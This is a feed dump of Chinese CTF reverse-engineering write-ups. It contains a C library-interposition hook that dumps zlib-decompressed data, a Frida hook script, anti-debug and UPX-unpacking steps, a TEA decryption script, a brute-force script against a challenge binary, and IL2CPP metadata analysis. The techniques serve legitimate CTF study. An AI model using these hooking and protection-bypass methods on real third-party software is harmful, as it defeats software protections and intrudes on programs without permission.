strm-&gt;avail_out;</span><br><span class="line">        before_next_out = strm-&gt;next_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rc = real_inflate(strm, flush);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// After call, compute produced bytes</span></span><br><span class="line">    <span class="keyword">if</span> (strm &amp;&amp; before_next_out) &#123;</span><br><span class="line">        uInt after_avail = strm-&gt;avail_out;</span><br><span class="line">        <span class="keyword">if</span> (before_avail &gt; after_avail) &#123;</span><br><span class="line">            <span class="type">size_t</span> produced = (<span class="type">size_t</span>)(before_avail - after_avail);</span><br><span class="line">            <span class="comment">// produced bytes start at before_next_out</span></span><br><span class="line">            dump_bytes(before_next_out, produced);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- hook for inflateEnd: maybe flush or marker ---- */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*inflateEnd_t)</span><span class="params">(z_streamp)</span>;</span><br><span class="line"><span class="type">static</span> inflateEnd_t real_inflateEnd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">inflateEnd</span><span class="params">(z_streamp strm)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_inflateEnd) &#123;</span><br><span class="line">        real_inflateEnd = (inflateEnd_t)dlsym(RTLD_NEXT, <span class="string">&quot;inflateEnd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Optionally write a marker to separate streams</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> marker[] = <span class="string">&quot;\n--INFLATE-END--\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (outfd &gt;= <span class="number">0</span>) write(outfd, marker, <span class="keyword">sizeof</span>(marker)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!real_inflateEnd) <span class="keyword">return</span> Z_STREAM_ERROR;</span><br><span class="line">    <span class="keyword">return</span> real_inflateEnd(strm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- Also hook inflateInit2_ / inflateInit_ variants to ensure we find overloaded names ----</span></span><br><span class="line"><span class="comment">   Signatures:</span></span><br><span class="line"><span class="comment">     int inflateInit_(z_streamp strm, const char *version, int stream_size);</span></span><br><span class="line"><span class="comment">     int inflateInit2_(z_streamp strm, int windowBits, const char *version, int stream_size);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*inflateInit__t)</span><span class="params">(z_streamp, <span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">static</span> inflateInit__t real_inflateInit_ = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">inflateInit_</span><span class="params">(z_streamp strm, <span class="type">const</span> <span class="type">char</span> *version, <span class="type">int</span> stream_size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_inflateInit_) real_inflateInit_ = (inflateInit__t)dlsym(RTLD_NEXT, <span class="string">&quot;inflateInit_&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!real_inflateInit_) <span class="keyword">return</span> Z_STREAM_ERROR;</span><br><span class="line">    <span class="keyword">return</span> real_inflateInit_(strm, version, stream_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*inflateInit2__t)</span><span class="params">(z_streamp, <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">static</span> inflateInit2__t real_inflateInit2_ = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">inflateInit2_</span><span class="params">(z_streamp strm, <span class="type">int</span> windowBits, <span class="type">const</span> <span class="type">char</span> *version, <span class="type">int</span> stream_size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_inflateInit2_) real_inflateInit2_ = (inflateInit2__t)dlsym(RTLD_NEXT, <span class="string">&quot;inflateInit2_&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!real_inflateInit2_) <span class="keyword">return</span> Z_STREAM_ERROR;</span><br><span class="line">    <span class="keyword">return</span> real_inflateInit2_(strm, windowBits, version, stream_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301728519.png" alt="image-20251030172832322"></p><p>可以得到</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301728896.png" alt="image-20251030172849737"></p><p>010打开</p><p>直接看到flag</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301729003.png" alt="image-20251030172909809"></p><blockquote><p><code>uncompress</code> wrapper（legacy 接口）</p><p>签名：<code>int uncompress(Bytef *dest, uLongf *destLen, const Bytef *source, uLong sourceLen)</code>。这是 zlib 的一次性解压函数（非流式）。</p><p>我们的 wrapper 做：</p><ol><li>延迟解析真实函数地址 <code>real_uncompress = dlsym(RTLD_NEXT, &quot;uncompress&quot;)</code>（第一次调用时解析）。</li><li>调用 <code>real_uncompress(dest, destLen, source, sourceLen)</code> —— 让 zlib 把数据解压到 <code>dest</code>。</li><li>如果返回 <code>Z_OK</code> 并且 <code>*destLen &gt; 0</code>，就把 <code>dest</code> 的 <code>*destLen</code> 字节写到输出文件（<code>dump_bytes(dest, *destLen)</code>)。</li></ol><p>为什么先调用真实函数再写？因为只有在真实函数成功解压后，<code>dest</code> 才包含明文，直接写出我们需要的明文；若先写会只得到压缩态或未填充的缓冲。</p></blockquote><p>flag{Reverse_This_Ultra_Hard_Challenge!!!}</p><h3 id="解法三-frida-hook"><a href="#解法三-frida-hook" class="headerlink" title="解法三:frida_hook"></a>解法三:frida_hook</h3><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301947108.png" alt="image-20251030194730909"></p><p>注意到这个函数在(libpython3.5m.so.1.0)这个so文件中</p><p>有一个比较，可以hook一下可以直接出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> user_input == decrypted:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>)</span><br></pre></td></tr></table></figure><p>本题是有反调的，可能双进程都有，如何注入可以自行让ai写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mInterval = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sgame = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libpython3.5m.so.1.0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sgame == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in">clearInterval</span>(mInterval);</span><br><span class="line">   <span class="keyword">var</span> addr = sgame.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x7FD90</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span> + addr);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(addr).<span class="title function_">toString</span>());</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(args[<span class="number">0</span>]), &#123; <span class="attr">length</span>: <span class="number">50</span>, <span class="attr">ansi</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="title function_">ptr</span>(args[<span class="number">1</span>]), &#123; <span class="attr">length</span>: <span class="number">100</span>, <span class="attr">ansi</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="number">1</span>) </span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302041283.png" alt="image-20251030204115090"></p><h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="YJS-指鹿为马"><a href="#YJS-指鹿为马" class="headerlink" title="YJS-指鹿为马"></a>YJS-指鹿为马</h2><p>AI的题就该让AI做 </p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044826.png" title=" =1076x879"></p><p>\n <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044827.png" title=" =770x1657"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;“华为杯”第四届中国研究生网络安全创新大赛-Megrez-RE-WP&quot;&gt;&lt;a href=&quot;#“华为杯”第四届中国研究生网络安全创新大赛-Megrez-RE-WP&quot; class=&quot;headerlink&quot; title=&quot;“华为杯”第四届中国研究生网络安全创新大赛 Me</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF 2025 re wp</title>
    <link href="http://matriy330.github.io/f925a96f/"/>
    <id>http://matriy330.github.io/f925a96f/</id>
    <published>2025-11-05T13:45:34.000Z</published>
    <updated>2025-11-05T13:46:18.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-2025-re-wp"><a href="#NSSCTF-2025-re-wp" class="headerlink" title="NSSCTF 2025 re wp"></a>NSSCTF 2025 re wp</h1><h2 id="ez-tea"><a href="#ez-tea" class="headerlink" title="ez_tea"></a>ez_tea</h2><p>ez_tea不ez</p><p>没改附件版本：</p><p>动调有几个地方需要绕过</p><p>对isDebuggerPrensent进行交叉引用，对isDebuggerPrensent的绕过方法基本是改zf标志位，此外还有一个地方绕过需要把0x70改成0x71修改寄存器</p><blockquote><p>此题别用patch方法，因为上面那个0xcccc貌似是crc校验</p></blockquote><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015148.png" alt="image-20251103223128204"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052017526.png" alt="image-20251105201744462"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052017146.png" alt="image-20251105201759098"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052018924.png" alt="image-20251105201819875"></p><p>同时看到这有个exit也交叉引用下</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052020159.png" alt="image-20251105202022110"></p><p>这里也有个exit</p><p>绕过后经过动调发现，这个方法会对key进行修改，我们可以断再fmt这个方法上就可以发现dst的地址是key的地址</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015126.png" alt="image-20251103223427732"></p><blockquote><p>这块如何修改的key? 是tea_encrypt_wrapper这个方法的机器码值+78然后patch到了key</p></blockquote><p><strong>另一种发现hook的方法</strong>，当你写了解密脚本发现不对，可以到处交叉引用看看</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015112.png" alt="image-20251103223633887"></p><p>可以返现这个方法被神奇的其它地方交叉引用了</p><p>最后写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">delta = <span class="number">0x0D000721</span></span><br><span class="line">rounds = <span class="number">32</span></span><br><span class="line">key_ascii = <span class="string">&quot;1384774E4E13CFC3&quot;</span></span><br><span class="line">key_bytes = key_ascii.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">key_words = [<span class="built_in">int</span>.from_bytes(key_bytes[i:i + <span class="number">4</span>], <span class="string">&quot;little&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x7d</span>, <span class="number">0x91</span>, <span class="number">0xeb</span>, <span class="number">0x59</span>, <span class="number">0x8d</span>, <span class="number">0xd1</span>, <span class="number">0xf9</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0x76</span>, <span class="number">0xef</span>, <span class="number">0xcd</span>, <span class="number">0xa1</span>, <span class="number">0x6b</span>, <span class="number">0x07</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x3e</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x5f</span>, <span class="number">0x63</span>, <span class="number">0xbb</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0xc3</span>, <span class="number">0x34</span>, <span class="number">0xa3</span>, <span class="number">0x07</span>, <span class="number">0x64</span>, <span class="number">0x33</span>, <span class="number">0xde</span>,</span><br><span class="line">    <span class="number">0xf6</span>, <span class="number">0x70</span>, <span class="number">0xec</span>, <span class="number">0x4d</span>, <span class="number">0x5b</span>, <span class="number">0x7e</span>, <span class="number">0x2b</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0xcc</span>, <span class="number">0xa7</span>, <span class="number">0xd3</span>, <span class="number">0x4a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1</span>):</span><br><span class="line">    total = (delta * rounds) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        idx2 = (((total &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0xFF</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span></span><br><span class="line">        mix2 = (key_words[idx2] + ((v0 &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 = (v1 - (((v0 &gt;&gt; <span class="number">5</span>) ^ mix2) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        idx1 = (total &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span></span><br><span class="line">        mix1 = (key_words[idx1] + ((v1 &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &gt;&gt; <span class="number">5</span>) ^ mix1) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        total = (total - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mutated = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">8</span>):</span><br><span class="line">    w0 = <span class="built_in">int</span>.from_bytes(cipher[off:off + <span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    w1 = <span class="built_in">int</span>.from_bytes(cipher[off + <span class="number">4</span>:off + <span class="number">8</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    p0, p1 = tea_decrypt_block(w0, w1)</span><br><span class="line">    mutated.extend(p0.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    mutated.extend(p1.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">plain = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(mutated))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mutated), <span class="number">2</span>):</span><br><span class="line">    b0 = mutated[i]</span><br><span class="line">    b1 = mutated[i + <span class="number">1</span>]</span><br><span class="line">    plain[i] = ((b0 ^ <span class="number">0x72</span>) - <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    plain[i + <span class="number">1</span>] = ((b1 ^ <span class="number">0x02</span>) + <span class="number">2</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag bytes (hex):&quot;</span>, plain.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag (latin-1):&quot;</span>, plain.decode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag (latin-1): NSSCTF{13ce5888-01b4-4287-8593-eb975ab6cf{±­F\¡Æ</p><p>有点怪</p><p>看了下密文可能是4个0000000字节搞的鬼</p><p>可以爆破，一开始有一个爆破思路因为是诸字节爆破，我们可以使用测信道攻击，因为诸位比较，提前一位退出和新比较一位退出的时间上有区别，我们计算这个时间长度来判别即可</p><p>后来验证不行</p><p>第二个方法是爆破，因为一开始没看出来只觉得有点眼熟，后来看出来了是个uuid，对比下就知道还少两个字节，因此其实只有两个字节需要爆破，再加上最后的}就行了</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015140.png" alt="image-20251103224311574"></p><p>爆破exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./ez_tea.exe&quot;</span>  <span class="comment"># 目标程序路径</span></span><br><span class="line">PREFIX = <span class="string">&quot;NSSCTF&#123;13ce5888-01b4-4287-8593-eb975ab6cf&quot;</span></span><br><span class="line">CHARSET = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">LAST_CHAR = <span class="string">&quot;&#125;&quot;</span>  <span class="comment"># 最后一位固定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_candidate</span>(<span class="params">candidate: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    proc = subprocess.run(</span><br><span class="line">        [BINARY],</span><br><span class="line">        <span class="built_in">input</span>=candidate.encode(<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>),</span><br><span class="line">        stdout=subprocess.PIPE,</span><br><span class="line">        stderr=subprocess.PIPE,</span><br><span class="line">        check=<span class="literal">False</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> (proc.stdout + proc.stderr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> tail <span class="keyword">in</span> itertools.product(CHARSET, repeat=<span class="number">2</span>):</span><br><span class="line">        candidate = PREFIX + <span class="string">&quot;&quot;</span>.join(tail) + LAST_CHAR</span><br><span class="line">        <span class="keyword">if</span> run_candidate(candidate):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Hit: <span class="subst">&#123;candidate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;candidate&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;枚举完毕仍未命中，请检查前缀或字符集。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>[+] Hit: NSSCTF{13ce5888-01b4-4287-8593-eb975ab6cf6a}</p><h1 id="runner"><a href="#runner" class="headerlink" title="runner"></a>runner</h1><h2 id="解法1：跑图"><a href="#解法1：跑图" class="headerlink" title="解法1：跑图"></a>解法1：跑图</h2><p>不如直接跑图快</p><p><a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit</a></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052123159.png" alt="image-20251105212313982"></p><h2 id="解法2：分析dat"><a href="#解法2：分析dat" class="headerlink" title="解法2：分析dat"></a>解法2：分析dat</h2><p>非预期</p><p>直接看globalxxx.dat</p><p>因为assertstudio解出来没有二维码资源说明是动态生成的，一般在这个文件中，直接滑能找到大面积的01，写个脚本可以提取恢复</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052046761.png" alt="image-20251105204657663"></p><h2 id="解法3：静态分析"><a href="#解法3：静态分析" class="headerlink" title="解法3：静态分析"></a>解法3：静态分析</h2><p>太详细的步骤没有保存</p><blockquote><p>关于il2cppDump的使用可以看<a href="https://xz.aliyun.com/news/15811">unity引擎基于Windows下的il2cpp逆向初探——以CTF赛题为例-先知社区</a></p></blockquote><p>一般pc逆向的il2cpp的unity，主逻辑在GameAssembly.dll里，但是发现有upx，直接脱壳失败</p><p>看了下发现了，居然魔改了</p><p>用010editor打开然后把里面的NSS标志恢复成UPX就行了</p><p>然后直接脱壳，拖入ida即可静态分析</p><p>静态分析大部分没有函数名</p><p>因为il2cpp的unity函数名等资源都在globalxxx.dat中</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052052232.png" alt="image-20251105205203134"></p><p>我们直接用il2cppDump这个工具</p><p><a href="https://github.com/Perfare/Il2CppDumper">Perfare&#x2F;Il2CppDumper: Unity il2cpp reverse engineer</a></p><p>执行Il2CppDumper.exe GameAssembly.dll 这类命令</p><p>即可dump出一个dump.cs和一堆dll</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052055886.png" alt="image-20251105205509816"></p><p>比较重要的的就这个Assembly-CSharp.dll</p><p>直接dnspy64打开</p><p>我们直接ctrl+alt+f搜索qrcode类似这种</p><p>可以搜到</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052056139.png" alt="image-20251105205655991"></p><p>然后这几个地址比较重要可能是构建二维码的地方</p><p>然后把dump出来的dump.cs和script.json导入(用于恢复函数名和符号，这个过程可能比较久，耐心等待)</p><blockquote><p>具体怎么导入不介绍，可以看il2cppdump的使用，就是上面的那个先知的链接</p></blockquote><p>下面的截图是我的分析过程，但是做题的时候没保存，所以我后面重新截了，但是做题时其实是有函数名的</p><p>上面几个地址此时有用了</p><p>我们可以依次跳转到这几个函数分析</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052104023.png" alt="image-20251105210444925"></p><p>具体我后面分析出来是这样的：</p><p>生成二维码的核心在 QRCodeBuilder（GameAssembly.dll 中的 sub_1808118B0 和 sub_180810F90）。构造函数里把一个 29×29 的常量矩阵塞进 qrMatrix，ConstructQRCode 再按矩阵值实例化黑&#x2F;白模块。借定位常量矩阵</p><p>QRCodeBuilder::.ctor 调用 sub_181652960，后者沿 IL2CPP 元数据把字段初值拷到 qrMatrix。</p><p>使用采样脚本扫描 global-metadata.dat 的默认值段，发现长为 29×29、元素仅 0&#x2F;1 的块起始索引为 19740（整数视图），即矩阵。</p><p>QRCodeBuilder.qrMatrix 是 int[,]，初值并不在 Assembly-CSharp.dll 里，而是存放在 IL2CPP 的全局元数据段（相当于 C# 的 static readonly 初始化块）中。构造函数 GameAssembly.dll:0x1808118B0 调用 sub_181652960，该函数沿元数据读取字段默认值，把一块连续内存写进 qrMatrix。</p><p><strong>矩阵的出处与定位</strong></p><p>QRCodeBuilder.qrMatrix 是 int[,]，初值并不在 Assembly-CSharp.dll 里，而是存放在 IL2CPP 的全局元数据段（相当于 C# 的 static readonly 初始化块）中。</p><p>具体来说：</p><ol><li>script.json让我们知道 QRCodeBuilder 的字段顺序与 qrMatrix 的类型，从而确定它使用了字段默认值（FieldRVA）。</li><li>global-metadata.dat 头部第 18、19 项是 “Field &amp; Parameter Default Value Data”的偏移与长度。扫描这一段时我查找 841 (&#x3D;29×29) 个 32 位整数全部为 0&#x2F;1 的区块；正好在偏移 data_offset + 19740*4 处找到独一无二的块，这就是 qrMatrix 的初始内容。之所以能定位到索引 19740，是因为 Il2CppDumper 的 FieldRVA</li></ol><p>sub_181652960 为什么判定为把字段默认值抄进 qrMatrix?</p><p>在 GameAssembly.dll:0x1808118B0（QRCodeBuilder::.ctor）里，r9 被赋为 qrMatrix，随后调用 sub_181652960(r9, qword_182F726A8, …)。</p><p>反编译 sub_181652960 可见，它先调用 sub_181633EE0 &#x2F; sub_18180BD40 检查数组状态，之后求得一个临时数组并调用 sub_181652A40。</p><p>sub_181652A40 直接把两个指针传给 sub_1805CA600，而 sub_1805CA600 里先取 arg1 的数组句柄，再调用 sub_180450230(arg2)——这是 Unity&#x2F;IL2CPP 的“读取 FieldRVA 数据”例程。它往下会调用 sub_180558480 → sub_1805584E0 -&gt; (中间可能还有两个函数) → sub_180769120，正是枚举 global-metadata.dat 元数据并按字段索引取默认值的标准流程。因此可以确认 sub_181652960 就是在把元数据里预存的 int[,] 常量搬到 qrMatrix。</p><p><strong>data_offset 的来源与数值</strong></p><p>global-metadata.dat 头部是 32 个 uint32。第 18、19 个元素分别是 FieldAndParameterDefaultValueDataOffset 和 FieldAndParameterDefaultValueDataCount。</p><p>用 Python 解出的值：</p><p>field_and_param_default_data_offset &#x3D; struct.unpack_from(“&lt;I”, meta, 18<em>4)[0]  # &#x3D; 1782496</em></p><p>field_and_param_default_data_size   &#x3D; struct.unpack_from(“&lt;I”, meta, 19*4)[0]  # &#x3D; 89632</p><p>这就是我代码里 data_offset 的来源，它不是扫描出来的，而是直接从元数据头读取的标准字段。</p><p>为什么定位到 data_offset + 19740*4</p><ul><li>19740 是 qrMatrix 的 FieldRVA 在默认值数组中的索引，Il2CppDumper 会在 script.json 的 ScriptMetadataMethod &#x2F; ScriptMethod 等条目里把同一块地址列出来。</li><li>我第一遍是扫整段默认值数据，把所有“连续 841 个 uint32 只含 0&#x2F;1”的片段列出来，确实只有索引 19740 附近满足条件（对应 29×29 阵列）。之后把这个索引写死在脚本里，方便重复利用。</li><li>结合 sub_181652960 的调用链，就能确认这块数据正好就是构造函数读取的二维码矩阵。</li></ul><p>我怎么知道怎么知道第 18、19 个元素分别是 FieldAndParameterDefaultValueDataOffset 和FieldAndParameterDefaultValueDataCount指向二维码的地方</p><p>那两个数不是随便猜的，而是来自 Unity&#x2F;IL2CPP 的公开结构：global-metadata.dat 文件开头固定是 32 个 uint32，顺序在 Unity 官方的 Il2CppGlobalMetadataHeader（il2cpp&#x2F;libil2cpp&#x2F;vm&#x2F;GlobalMetadata.h）里写得一清二楚。第 18、19 个成员就叫 fieldAndParameterDefaultValueDataOffset&#x2F;Count，说的是“字段默认值与参数默认值的数据区”在文件里的起始位置和长度。</p><p>二维码为什么会在这里？因为 QRCodeBuilder.qrMatrix 是个 int[,] 